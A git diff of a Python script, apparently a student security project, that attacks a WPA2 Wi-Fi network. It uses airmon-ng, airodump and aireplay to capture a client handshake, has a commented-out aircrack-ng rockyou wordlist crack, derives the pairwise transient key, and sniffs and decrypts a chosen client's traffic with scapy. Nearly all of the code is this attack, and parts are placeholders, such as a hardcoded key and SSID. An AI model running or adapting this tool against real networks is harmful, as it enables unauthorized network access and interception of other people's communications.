@@ -5,158 +5,176 @@ from scapy.all import *
 import subprocess as sub
 import WPA2
 from binascii import *
-import handshake
+import Handshake
 
 
 class sniffer():
-    def __init__(self):
-        self.dfilepath = str(sub.run("pwd", capture_output=True).stdout)[2:-3]
+	def __init__(self):
+		self.dfilepath = str(sub.run("pwd", capture_output=True).stdout)[2:-3]
 
-        start = input("First time starting up? [Y/N]:")
+		start = input("First time starting up? [Y/N]:")
 
-        if start == "Y" or start == "y":
-            # put everything in monitor mode when starting up
-            print("Killing services")
-            os.system("sudo airmon-ng check kill")
-            print("Starting wlan1mon")
-            os.system("sudo airmon-ng start wlan1 1")
-            print("Done")
+		if start == "Y" or start == "y":
+			# put everything in monitor mode when starting up
+			print("Killing services")
+			os.system("sudo airmon-ng check kill")
+			print("Starting wlan1mon")
+			os.system("sudo airmon-ng start wlan1 1")
+			print("Done")
 
-        print("Which wifi do you want to crack")
+		print("Which wifi do you want to crack")
 
-        self.wifi = input("Wifi name: ")
-        self.find_mac()
+		self.wifi = "4B1"#input("Wifi name: ")
+		self.find_mac()
 
-    def find_mac(self):
-        print("Finding Mac-Adress")
+		print("Starting to sniff")
+		self.sniff_packets()
 
-        os.system("sudo iwlist wlan0 scan|grep -A 10 -B 10 {} >".format(self.wifi) + self.dfilepath + "/output.txt")
+	def find_mac(self):
+		print("Finding Mac-Adress")
 
-        wifi_list = open(self.dfilepath + "/output.txt", 'r').read()
-        index = wifi_list.index("Address")
+		os.system("sudo iwlist wlan0 scan|grep -A 10 -B 10 {} >".format(self.wifi) + self.dfilepath + "/output.txt")
 
-        self.mac = wifi_list[index + len("Address: "):index + len("Address: ") + 17]
-        self.get_key()
+		wifi_list = open(self.dfilepath + "/output.txt", 'r').read()
+		index = wifi_list.index("Address")
 
-    def get_master_key(self):
-        # code for cracking the key
-        # find key using the iv's in .cap file
-        if not os.path.isfile(self.dfilepath + "/WPA_{}-01.cap".format(self.mac)):
-            self.make_cap()
+		self.mac = wifi_list[index + len("Address: "):index + len("Address: ") + 17]
+		self.get_master_key()
 
-        print("Cracking the key")
-        #		os.system("sudo aircrack-ng " + self.dfilepath + "/WPA_{}-01.cap -w ".format(self.mac) + "/home/kali/rockyou.txt>" + self.dfilepath + "/key_info.txt")
-        #		key_file = open(self.dfilepath + "/key_info.txt", "r").read()
-        #		index = key_file.index("KEY FOUND!") + len('KEY FOUND! [ ')
-        self.master_key = "123456781234567f"
+	def get_master_key(self):
+		# code for cracking the key
+		# find key using the iv's in .cap file
+		if not os.path.isfile(self.dfilepath + "/WPA_{}-01.cap".format(self.mac)):
+			self.make_cap()
 
-        #		while key_file[index] != ' ':
-        #			self.master_key += key_file[index]
-        #			index += 1
+		print("Cracking the key")
+		#		os.system("sudo aircrack-ng " + self.dfilepath + "/WPA_{}-01.cap -w ".format(self.mac) + "/home/kali/rockyou.txt>" + self.dfilepath + "/key_info.txt")
+		#		key_file = open(self.dfilepath + "/key_info.txt", "r").read()
+		#		index = key_file.index("KEY FOUND!") + len('KEY FOUND! [ ')
+		self.master_key = "123456781234567f"
 
-        print("Key has been found: {}".format(self.master_key))
-        print("Starting to sniff")
+		#		while key_file[index] != ' ':
+		#			self.master_key += key_file[index]
+		#			index += 1
 
-        self.get_transient_key()
+		print("Key has been found: {}".format(self.master_key))
+		print("Finding transient key")
 
-    def condense_mac(self, mac):
-        condensed_mac = ""
-        for i in range(len(mac)):
-            if ((i+1) % 3) != 0:
-                condensed_mac += mac[i]
-        return condensed_mac
+		self.get_transient_key()
 
-    def get_transient_key(self):
+	def condense_mac(self, mac):
+		condensed_mac = ""
 
-        password = self.master_key
-        ssid = self.wifi
-        capfile = rdpcap(self.dfilepath + "/WPA_{}-01.cap".format(self.mac))
-        handshakes = []
-        for i in capfile:
-            if i.haslayer(EAPOL):
-                handshakes.append(i)
+		for i in range(len(mac)):
+			if ((i+1) % 3) != 0:
+				condensed_mac += mac[i]
 
-        if len(handshakes) > 4:
-            handshakes = handshake.handshake_sorter(handshakes)
-            if len(handshakes) == 0:
-                print('no complete handshake')
-        elif len(handshakes) < 4:
-            print('no complete handshake')
-        else:
-            if bytes_hex(handshakes[0][Raw]).decode('utf-8')[154:186] != '0' * 32:
-                print('no complete handshake')
+		return condensed_mac
 
-        load1 = hexlify(bytes(handshakes[0][EAPOL][Raw])).decode('utf-8')
-        load2 = hexlify(bytes(handshakes[1][EAPOL][Raw])).decode('utf-8')
+	def get_transient_key(self):
+		password = self.master_key
+		ssid = self.wifi
+		capfile = rdpcap(self.dfilepath + "/WPA_{}-01.cap".format(self.mac))
+		handshakes = []
+		for i in capfile:
+			if i.haslayer(EAPOL):
+				handshakes.append(i)
 
-        assert self.mac == handshakes[0].addr2
-        mac_ap = a2b_hex(self.condense_mac(self.mac))
-        mac_cl = a2b_hex(self.condense_mac(handshake[0].addr1))
+		if len(handshakes) > 4:
+			handshakes = Handshake.handshake_sorter(handshakes)
+			if len(handshakes) == 0:
+				print('No complete Handshake')
+		elif len(handshakes) < 4:
+			print('No complete handshake')
+		else:
+			if bytes_hex(handshakes[0][Raw]).decode('utf-8')[154:186] != '0' * 32:
+				print('No complete handshake')
 
-        anonce = a2b_hex(load1[26:90])
-        snonce = a2b_hex(load2[26:90])
+		load1 = hexlify(bytes(handshakes[0][EAPOL][Raw])).decode('utf-8')
+		load2 = hexlify(bytes(handshakes[1][EAPOL][Raw])).decode('utf-8')
 
-        PKE = "Pairwise key expansion"  # Standard Set Value so we don't know what it is
-        PMK = handshake.pmk_generation(password, ssid)
-        key_data = str(min(mac_ap, mac_cl) + max(mac_ap, mac_cl) + min(anonce, snonce) + max(anonce, snonce))
-        PTK = handshake.ptk_generation(PMK, PKE, key_data)
+		assert self.mac.lower() == handshakes[0].addr2
+		mac_ap = a2b_hex(self.condense_mac(self.mac))
+		mac_cl_bin = a2b_hex(self.condense_mac(handshakes[0].addr1))
+		
+		self.mac_cl = handshakes[0].addr1
 
-        self.transient_key = PTK
+		anonce = a2b_hex(load1[26:90])
+		snonce = a2b_hex(load2[26:90])
 
-        self.sniff_packets()
+		PKE = "Pairwise key expansion"  # Standard Set Value so we don't know what it is
+		PMK = Handshake.pmk_generation(password, ssid)
+		key_data = str(min(mac_ap, mac_cl_bin) + max(mac_ap, mac_cl_bin) + min(anonce, snonce) + max(anonce, snonce))
+		PTK = Handshake.ptk_generation(PMK, PKE, key_data)
 
-    def decrypt(self, packet):
-        self.key = WPA2.key_to_matrix(self.key)
-        nb_cols = len(self.key[0])
+		self.transient_key = WPA2.key_to_matrix(PTK)
+		print(self.transient_key)
+		nb_cols = len(self.transient_key[0])
 
-        rounds = 0
+		self.rounds = 10
 
-        if nb_cols == 4:
-            rounds = 10
-        elif nb_cols == 6:
-            rounds = 12
-        elif nb_cols == 8:
-            rounds = 14
+		if nb_cols == 6:
+			self.rounds = 12
+		elif nb_cols == 8:
+			self.rounds = 14
 
-        encrypted_mess = hexlify(str(packet))
-        unencrypted_mess = WPA2.decrypt_wpa2_data(encrypted_mess, self.key, rounds)
-        #		unencrypted_mess = self.filter_packets(unencrypted_mess)
+	def decrypt(self, packet):
+		encrypted_mess = self.make_matrix(bytes_hex(packet.getlayer(Raw)))
+		
+		unencrypted_mess = WPA2.decrypt_wpa2_data(encrypted_mess, self.transient_key, self.rounds)
+		#unencrypted_mess = self.filter_packets(unencrypted_mess)
+		return unencrypted_mess
 
-        return unencrypted_mess
+	def filtersniff(self, packet):
+		if packet is None:
+			pass
+		elif packet.haslayer(Raw):
+			if (packet.addr1 == self.mac_cl) or (packet.addr2 == self.mac_cl):				
+				return packet
 
-    def filtersniff(self, packet):
-        if packet.haslayer(Dot11Beacon):
-            if packet[Dot11Beacon].network_stats()["ssid"] == "4B1":
-                return packet
+	def sniff_packets(self):
+		print(self.mac_cl)
+		sniff(iface="wlan1mon", lfilter=self.filtersniff, prn=self.decrypt)
 
-    def sniff_packets(self):
-        sniff(iface="wlan1mon", lfilter=self.filtersniff, prn=self.decrypt)
+	def filter_packets(self, message):
+		alfabet = [chr(elem) for elem in range(48, 123)]
+		filtered_message = ""
 
-    def filter_packets(self, message):
-        alfabet = [chr(elem) for elem in range(48, 123)]
-        filtered_message = ""
+		for elem in message:
+			if elem == " ":
+				filtered_message += " "
+			if elem in alfabet or elem.isdigit():
+				filtered_message += elem
+			else:
+				continue
 
-        for elem in message:
-            if elem == " ":
-                filtered_message += " "
-            if elem in alfabet or elem.isdigit():
-                filtered_message += elem
-            else:
-                continue
+		if len(filtered_message) < 5:
+			return ''
 
-        if len(filtered_message) < 5:
-            return ''
+		return filtered_message
 
-        return filtered_message
+	def make_cap(self):
+		process2 = sub.Popen(["xterm", "-e", "sudo python3 " + self.dfilepath + "/AirodumpWPA2.py {} {}".format(self.mac, self.dfilepath)])
+		process1 = sub.Popen(["xterm", "-e", "sudo python3 " + self.dfilepath + "/AireplayWPA2.py {}".format(self.mac)])
+		process1.wait()
+		process2.wait()
 
-    def make_cap(self):
-        process2 = sub.Popen(["xterm", "-e",
-                              "sudo python3 " + self.dfilepath + "/PenO3-Kali/WPA2/AirodumpWPA2.py {} {}".format(
-                                  self.mac, self.dfilepath)])
-        process1 = sub.Popen(
-            ["xterm", "-e", "sudo python3 " + self.dfilepath + "/PenO3-Kali/WPA2/AireplayWPA2.py {}".format(self.mac)])
-        process1.wait()
-        process2.wait()
+	def make_matrix(self, encrypted_message):
+		encrypted_message = encrypted_message.decode('utf-8')
+		encrypted_matrix = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]]
+
+		for i in range(4):
+			for j in range(4):
+				if len(encrypted_message) == 0:
+					break
+
+
+				buff = encrypted_message[:2]
+
+				encrypted_message = encrypted_message[2:]
+				encrypted_matrix[j][i] = int(buff, 16)
+
+		return encrypted_matrix	
 
 
 sniffer()
